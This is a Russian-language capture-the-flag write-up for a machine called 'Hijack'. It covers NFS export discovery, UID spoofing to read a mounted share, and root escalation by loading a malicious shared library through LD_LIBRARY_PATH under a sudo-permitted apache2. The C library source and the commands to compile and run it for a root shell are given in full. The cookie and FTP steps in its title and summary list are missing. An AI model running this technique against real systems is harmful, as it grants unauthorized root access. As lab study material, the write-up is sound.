# Hijack — NFS, подмена cookie и LD_LIBRARY_PATH

## Разведка NFS

Сканирование показало, что на сервере работает NFS. Сначала я пытался подключить стандартный путь `/var/nfs/share`, но получил отказ. Для NFS нельзя угадывать путь: нужно сначала узнать список экспортируемых директорий.

```bash
showmount -e <IP>
```

Сервер вернул экспорт `/mnt/share`, доступный для всех клиентов (`*`).

![Обнаружение NFS-сервиса](../images/Pasted%20image%2020260507184836.png)

![Результат проверки экспортируемых директорий](../images/Pasted%20image%2020260507184949.png)

## Подключение NFS и сопоставление UID

Подключил найденную директорию:

```bash
mount -t nfs <IP>:/mnt/share /mnt/share
```

После монтирования файлы отображались с числовыми UID, а доступа к ним не было. Это связано с тем, что NFS проверяет числовой UID, а не имя пользователя.

![Смонтированная NFS-директория](../images/Pasted%20image%2020260523190231.png)

![Файлы с числовыми владельцами и ограниченными правами](../images/Pasted%20image%2020260523190958.png)

Создал локального пользователя и назначил ему нужный UID:

```bash
sudo useradd -m -s /bin/bash auditor_test
sudo usermod -u 1003 auditor_test
ls -ln /mnt/share
```

После совпадения UID получил доступ к файлам.

![Проверка доступа после изменения UID](../images/Pasted%20image%2020260523191249.png)

## Повышение привилегий через `LD_LIBRARY_PATH`

После получения доступа проверил разрешения `sudo -l` и обнаружил:

```text
env_keep += LD_LIBRARY_PATH
User rick may run: (root) /usr/sbin/apache2 ...
```

Это позволяет запускать Apache от имени root, сохраняя переменную `LD_LIBRARY_PATH`. Я подготовил библиотеку с конструктором, который выполняет `/bin/bash` с UID/GID `0`:

```c
#include <stdlib.h>
#include <sys/types.h>

void __attribute__((constructor)) init(void) {
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Скомпилировал библиотеку и положил её в `/tmp` под именем, которое Apache загружает при запуске:

```bash
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/pe.c
```

Запустил разрешённую команду с подменённым путём поиска библиотек:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

Apache загрузил мою библиотеку с правами root, после чего я получил привилегированную оболочку.

2. Подключил `/mnt/share` и сопоставил UID локального пользователя.
3. Нашёл файлы с подсказками для веб-приложения.
4. Исследовал cookie и FTP-доступ.
5. Использовал `LD_LIBRARY_PATH` вместе с разрешением запуска Apache от root.
6. Получил root-shell через подмену динамической библиотеки.
